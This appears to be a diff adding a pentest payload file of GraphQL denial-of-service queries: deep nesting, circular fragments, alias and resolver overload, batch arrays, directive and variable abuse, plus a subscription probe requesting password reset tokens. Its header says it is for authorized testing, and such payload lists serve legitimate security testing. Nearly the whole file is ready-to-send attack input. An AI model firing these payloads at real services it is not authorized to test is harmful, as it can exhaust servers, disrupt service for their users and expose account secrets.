@@ -1,0 +1,30 @@
+# GraphQL DoS / resource exhaustion — deep nesting, circular fragments, alias overload
+# Only test when DoS is in scope. Authorized testing only.
+
+# --- Deep nesting (adjust depth to target limits) ---
+{"query":"query { user { friends { friends { friends { friends { friends { friends { friends { id name } } } } } } } } } }"}
+
+# --- Circular fragment (Apollo/legacy parsers) ---
+{"query":"query { user { ...A } } fragment A on User { friends { ...B } } fragment B on User { friends { ...A } } }"}
+
+# --- Alias overload (1000 identical fields — reduce/increase for testing) ---
+{"query":"query { a1: __typename a2: __typename a3: __typename a4: __typename a5: __typename a6: __typename a7: __typename a8: __typename a9: __typename a10: __typename }"}
+
+# --- Field duplication on expensive resolver ---
+{"query":"query { u1: search(q:\"*\") { id } u2: search(q:\"*\") { id } u3: search(q:\"*\") { id } u4: search(q:\"*\") { id } u5: search(q:\"*\") { id } }"}
+
+# --- Array batch size probe (send N copies) ---
+[
+  {"query":"{ __typename }"},
+  {"query":"{ __typename }"},
+  {"query":"{ __typename }"}
+]
+
+# --- Directive overloading ---
+{"query":"query { user @include(if:true) @include(if:true) { id name email phone address } }"}
+
+# --- Variable explosion ---
+{"query":"query($a:String,$b:String,$c:String){ user(a:$a,b:$b,c:$c){ id } }","variables":{"a":"x","b":"x","c":"x"}}
+
+# --- Subscription fan-out probe (WebSocket) ---
+subscription { userUpdated { id email passwordResetToken } }
